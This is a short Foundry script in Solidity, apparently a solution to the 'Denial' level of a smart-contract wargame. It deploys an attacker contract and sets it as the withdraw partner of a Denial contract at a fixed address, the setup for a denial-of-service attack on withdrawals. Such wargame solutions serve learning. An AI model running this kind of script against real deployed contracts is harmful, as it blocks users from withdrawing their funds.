// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/20-Denial.sol";
import "../src/20-Denial.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Denial denial = Denial(payable(0x94b63869fc1E5d4ad654Eb04679eC2B4d193173f));

    function run() external{
        vm.startBroadcast();

        // Create attacker contract
        DenialAttacker denialAttacker = new DenialAttacker();

        // Set attacker as partner
        denial.setWithdrawPartner(address(denialAttacker));

        vm.stopBroadcast();
    }
}